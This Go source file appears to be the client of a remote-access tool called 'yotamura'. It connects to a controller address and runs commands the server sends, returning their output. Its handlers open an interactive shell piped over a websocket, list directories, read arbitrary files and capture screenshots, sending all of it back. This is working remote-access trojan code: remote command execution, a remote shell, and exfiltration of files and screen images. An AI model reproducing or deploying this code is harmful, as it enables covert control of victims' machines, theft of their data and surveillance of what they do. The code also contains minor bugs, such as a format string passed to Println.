package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"io"
	"log"
	"net/url"
	"os"
	"os/exec"
	"yotamura/common"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

func (c *Client) sendError(message common.Message, err error) {
	c.SendJsonMessage(common.CreateMessage(common.ErrorData{Type: message.Type, Error: err.Error()}))
}

func handleCommandWs(command string, address string) {
	u := url.URL{Scheme: "ws", Host: address, Path: "/commandWs"}
	fmt.Printf("connecting to %s\n", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("dial:", err)
		go reconnect()
		return
	}
	defer c.Close()

	fmt.Println("starting command")

	cmd := exec.Command(command)
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()

	go func() {
		data := make([]byte, 1<<20) // Read 1MB at a time
		amount, err := stdout.Read(data)
		if err != nil {
			log.Println("failed to read stdout", err)
		}
		log.Println("read %v\n", amount)
		c.WriteMessage(1, data)
	}()

	go func() {
		for {
			_, msg, err := c.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				go reconnect()
				return
			}
			_, err = stdin.Write(msg)
			if err != nil {
				log.Println("failed to write to stdin", err)
			}
		}
	}()
}

func (c *Client) initializeHandlers() {
	c.Actions = make(map[string]func(message common.Message))

	c.Actions["CommandData"] = func(message common.Message) {
		fmt.Println("command")
		var content common.CommandData
		common.DecodeData(message.Data, &content)

		if content.WaitForOutput {
			ExecBackground(content.Command)
			c.SendJsonMessage(common.CreateMessage(content))
			return
		}
		if content.Websocket {
			handleCommandWs(content.Command, c.Address)
			return
		}

		output, err := Exec(content.Command)
		if err != nil {
			fmt.Println(output, err)
			c.sendError(message, err)
			return
		}

		content.Output = string(output)
		c.SendJsonMessage(common.CreateMessage(content))
	}

	c.Actions["DirectoryData"] = func(message common.Message) {
		fmt.Println("file")
		var content common.DirectoryData
		common.DecodeData(message.Data, &content)
		var files []common.File
		osFiles, err := os.ReadDir(content.Path)
		if err != nil {
			c.sendError(message, err)
			return
		}
		for _, file := range osFiles {
			files = append(files, common.File{Name: file.Name(), IsDirectory: file.Type().IsDir()})
		}
		fmt.Println(files)
		c.SendJsonMessage(common.CreateMessage(common.DirectoryData{Path: content.Path, Files: files}))
	}
	c.Actions["ReadFileData"] = func(message common.Message) {
		fmt.Println("read")
		var content common.ReadFileData
		common.DecodeData(message.Data, &content)
		output, err := os.ReadFile(content.Path)
		if err != nil {
			c.sendError(message, err)
			return
		}
		c.SendJsonMessage(common.CreateMessage(common.ReadFileData{Path: content.Path, Content: output}))
	}
	c.Actions["ScreenshotData"] = func(message common.Message) {
		image, err := screenshot.CaptureDisplay(0)
		if err != nil {
			c.sendError(message, err)
			return
		}
		buf := new(bytes.Buffer)

		resizedImage := common.ResizeImage(image, 1280, 720)
		jpeg.Encode(buf, resizedImage, &jpeg.Options{Quality: 90})

		imageBytes, err := io.ReadAll(buf)
		if err != nil {
			c.sendError(message, err)
			return
		}

		c.SendJsonMessage(common.CreateMessage(common.ScreenshotData{Screenshot: imageBytes}))
	}
}
